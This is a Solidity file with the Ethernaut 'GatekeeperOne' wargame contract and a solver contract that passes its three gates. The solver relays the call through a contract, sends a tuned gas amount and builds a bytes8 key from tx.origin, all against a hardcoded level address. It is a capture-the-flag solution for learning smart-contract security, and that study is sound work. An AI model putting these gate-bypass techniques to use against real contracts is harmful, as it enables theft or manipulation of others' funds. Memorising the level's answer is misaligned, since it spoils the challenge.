// SPDX-License-Identifier: MIT
pragma solidity ^0.6.7;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one"); //0000 7878 | 7878
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two"); //0000 0000 9b8c 7878 | bd88 C5d1 0000 7878
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three"); //0x7878
    _; //0x798349E06c67272465123B91 bd88 C5d1 9b8c 7878
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract ethernautGatekeeper {
    function solve() public {
        GatekeeperOne contr = GatekeeperOne(0x4120Fab8524AafCcBa7c8e35815A8F147435BeA5);
        bytes8 keyPass = 0xbd88C5d100007878;
        contr.enter{gas: 81910 + 426}(keyPass);
    }
}
